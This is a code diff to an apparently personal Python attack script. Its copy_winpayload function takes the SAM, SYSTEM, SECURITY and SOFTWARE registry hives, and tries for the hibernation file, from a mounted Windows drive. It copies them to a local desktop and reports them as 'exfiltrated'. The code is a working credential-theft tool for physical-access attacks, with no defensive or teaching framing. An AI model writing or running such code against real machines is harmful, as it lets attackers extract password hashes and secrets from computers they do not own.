@@ -6,7 +6,7 @@
 
 #maybe import os?
 
-import sys, subprocess, argparse, time, shutil
+import sys, subprocess, argparse, time, shutil, os
 
 class Drive:
     def __init__(self):
@@ -58,12 +58,22 @@ def copy_winpayload():
     # them. This will be slow but very cool
 
     #^^^ dumb idea probably. A good idea wouldl be to refactor this and get rid of the shit hardcoded values for copy dest!
+    dirss = os.listdir('/media/windows')
+    print(dirss)
+    for dirs in dirss:
+        if "Windows" in str(dirs):
+            print(type(dirs))
+    # shutil.copyfile('/media/windows/hyberfil.sys*', '/home/zigmo/Desktop/hyberfil.sys')
+    # time.sleep(10)
+
+   
     try:
         shutil.copyfile('/media/windows/Windows/System32/config/SAM', '/home/zigmo/Desktop/SAM')
         shutil.copyfile('/media/windows/Windows/System32/config/SYSTEM', '/home/zigmo/Desktop/SYSTEM')
         shutil.copyfile('/media/windows/Windows/System32/config/SECURITY', '/home/zigmo/Desktop/SECURITY')
         shutil.copyfile('/media/windows/Windows/System32/config/SOFTWARE', '/home/zigmo/Desktop/SOFTWARE')
-        shutil.copyfile('/media/windows/hyberfil.sys', '/home/zigmo/Desktop/hyberfil.sys')
+        
+        # subprocess.Popen('sudo cp /media/windows/hyberfil.sys /home/zigmo/Desktop', shell=True)
         print('hybernation file has been exfiltrated to /home/zigmo/Desktop/hyberfil.sys\nSYSTEM SAM SECURITY and SOFTWARE registry hives have been succesfully exfiltrated to /home/zigmo/Desktop')
     except FileNotFoundError:
         print('drive not exploitable')
